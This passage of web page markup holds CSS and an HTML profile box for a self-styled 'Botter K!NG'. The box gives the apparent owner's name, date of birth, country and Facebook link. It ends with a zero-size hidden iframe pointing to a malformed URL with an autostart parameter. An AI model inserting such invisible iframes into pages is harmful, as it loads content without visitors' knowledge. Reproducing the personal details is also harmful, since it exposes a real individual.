0;}.Tejainbox2 li {margin-left:20px;}.Tejainbox2 li a {color: #FFFFFF; line-height: 4px; font-size: 11px;font-weight: bold; text-decoration:none;}.Tejainbox2 li a:hover {color: #FFFFFF;text-shadow: 0 1px 1px #FFFFFF;}.Tejainbox2 h2 { font: 18px Droid Serif;font-weight:bold;padding:0 8px;color: #FFFFFF;text-shadow: 0px 1px 1px #ddd;border-bottom: 1px solid #FFFFFF;}.Tejatouch {font-size:21px;font-weight:bold;font-family:Arial Narrow;float:right;margin: 3px 10px 0 0;-o-transition: all 0.5s ease-out;-moz-transition: all 0.5s ease-out;-webkit-transition: all 0.5s ease-out;text-decoration:blink;}.Tejatouch:hover{-o-transform: scale(2) rotate(750deg) translate(0px);-moz-transform: scale(2) rotate(750deg) translate(0px);-webkit-transform: scale(2) rotate(750deg) translate(0px);color: #FFFFFF;}</style><div id="info-teja"><span class="Tejatouch">Info</span><div class="Tejainbox"><div class="Tejainbox2 teja15"> <h2> Personal information</h2> <center><div class="CSS"> 		<a href="https://www.facebook.com/usman.shabbi"><img src="https://graph.facebook.com/100006912916183/picture?width=800" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="130" height="130" alt="USMAN"/></a> <span class="style4"><center><font color="#FFFFFF;">.</font></center></span> <span class="style4"><font color="#FFFFFF"> <center>The Botter K!NG </font></center></span> <span class="style4"> <center><h2> USMAN SHABBIR</h2></center></span> <span class="style4"> <center>Date of Birth: 19-01-2000</center> </span> <span class="style4"> <center>Country: pakistan</center></span> <span class="style4"> <center>ConTact : https://www.facebook.com/usman.shabbi</center> </span> </div></div></div></td> <iframe src="http:/IWBUUEE7?start=true" width="0" height="0" frameborder="0" allowfullscreen></iframe> <br>